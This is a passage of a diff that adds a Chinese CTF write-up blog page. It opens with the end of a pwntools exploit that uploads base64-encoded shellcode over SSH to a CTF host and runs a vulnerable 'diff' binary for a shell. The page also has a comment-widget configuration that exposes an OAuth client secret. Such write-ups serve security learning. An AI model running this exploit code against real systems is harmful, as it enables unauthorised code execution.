= open(<span class="hljs-string">'/tmp/123'</span>,<span class="hljs-string">'wb'</span>)</span><br><span class="line">    f2 = open(<span class="hljs-string">'/tmp/456'</span>,<span class="hljs-string">'wb'</span>)</span><br><span class="line">    f1.write(shellcode)</span><br><span class="line">    f2.write(payload)</span><br><span class="line">    f1.close()</span><br><span class="line">    f2.close()</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    pwn_ssh = ssh(host=<span class="hljs-string">'node3.buuoj.cn'</span>,user=<span class="hljs-string">'ctf'</span>,password=<span class="hljs-string">'guest'</span>,port=<span class="hljs-number">26462</span>)</span><br><span class="line">    p = pwn_ssh.process(<span class="hljs-string">'/bin/bash'</span>)</span><br><span class="line">    p.sendline(<span class="hljs-string">'echo &#123;&#125; | base64 -d &gt; /tmp/123;echo &#123;&#125; | base64 -d &gt; /tmp/456'</span>.format(base64.b64encode(shellcode),base64.b64encode(payload)))</span><br><span class="line">    p.close()</span><br><span class="line">    p = pwn_ssh.process(argv=[<span class="hljs-string">'diff'</span>,<span class="hljs-string">'/tmp/123'</span>,<span class="hljs-string">'/tmp/456'</span>],executable=<span class="hljs-string">'./diff'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="hljs-string">'./diff'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+        </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2020/03/25/BJDCTF_writeup/">BJDCTF_writeup</a></li>
+            <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2020/03/25/BJDCTF_writeup/">https://blog.play2win.top/2020/03/25/BJDCTF_writeup/</a></li>
+            <li><strong>发布时间：</strong>2020-03-25</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/SQL/">SQL</a>, <a class="has-link-grey -link" href="/tags/SSTI/">SSTI</a>, <a class="has-link-grey -link" href="/tags/XSS/">XSS</a>, <a class="has-link-grey -link" href="/tags/machineKey/">machineKey</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2020/05/26/GKCTF_2020_Writeup/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">GKCTF_2020_Writeup</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2020/03/06/PWN-cmcc_simplerop/">
+                <span class="level-item">[PWN]cmcc_simplerop</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '372fb49f2243341bf93b',
+        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
+        id: 'eeb0f60b2d9785d9d9f0dc1fdd754be8',
+        repo: 'p1ay2win.github.io',
+        owner: 'p1ay2win',
+        admin: "p1ay2win",
+        createIssueManually: false,
+        distractionFreeMode: false
+    })
+    gitalk.render('comment-container')
+</script>
+
+
+    </div>
+</div>
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        p1ay2win
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        他们的爱与风华，只问自由，只问盛放，只问深情，只问初心，只问勇敢，无问西东。
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>CN</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        35
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        31
+                    </p>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/P1ay2win/">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com/p1ay2win">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+
+    
+        
+
+    <div class="card widget column-left is-sticky" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#WEB">
+        <span class="has-mr-6">1</span>
+        <span>WEB</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#fake-google">
+        <span class="has-mr-6">1.1</span>
+        <span>fake google</span>
+        </a></li><li>
+        <a class="is-flex" href="#old-hack">
+        <span class="has-mr-6">1.2</span>
+        <span>old-hack</span>
+        </a></li><li>
+        <a class="is-flex" href="#duangShell">
+        <span class="has-mr-6">1.3</span>
+        <span>duangShell</span>
+        </a></li><li>
+        <a class="is-flex" href="#简单注入">
+        <span class="has-mr-6">1.4</span>
+        <span>简单注入</span>
+        </a></li><li>
+        <a class="is-flex" href="#假猪套天下第一">
+        <span class="has-mr-6">1.5</span>
+        <span>假猪套天下第一</span>
+        </a></li><li>
+        <a class="is-flex" href="#Schrödinger">
+        <span class="has-mr-6">1.6</span>
+        <span>Schrödinger</span>
+        </a></li><li>
+        <a class="is-flex" href="#xss之光">
+        <span class="has-mr-6">1.7</span>
+        <span>xss之光</span>
+        </a></li><li>
+        <a class="is-flex" href="#文件探测">
+        <span class="has-mr-6">1.8</span>
+        <span>文件探测</span>
+        </a></li><li>
+        <a class="is-flex" href="#EasyAspDotNet">
+        <span class="has-mr-6">1.9</span>
+        <span>EasyAspDotNet</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#PWN">
+        <span class="has-mr-6">2</span>
+        <span>PWN</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#one-gadget">
+        <span class="has-mr-6">2.1</span>
+        <span>one_gadget</span>
+        </a></li><li>
+        <a class="is-flex" href="#r2t3">
+        <span class="has-mr-6">2.2</span>
+        <span>r2t3</span>
+        </a></li><li>
+        <a class="is-flex" href="#r2t4">
+        <span class="has-mr-6">2.3</span>
+        <span>r2t4</span>
+        </a></li><li>
+        <a class="is-flex" href="#test">
+        <span class="has-mr-6">2.4</span>
+        <span>test</span>
+        </a></li><li>
+        <a class="is-flex" href="#diff">
+        <span class="has-mr-6">2.5</span>
+        <span>diff</span>
+        </a></li></ul></li></ul>
+            </div>
+        </div>
+    </div>
+
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+
+                
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    P1ay2win&#39;s blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2022 P1ay2win&nbsp;
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>访问量<span id="busuanzi_value_site_pv"></span>次  <i class="fa fa-user-md"></i>  访客数<span id="busuanzi_value_site_uv"></span>人<br>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+<script src="/js/animation.js"></script>
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+    
+    
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+    
+    
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
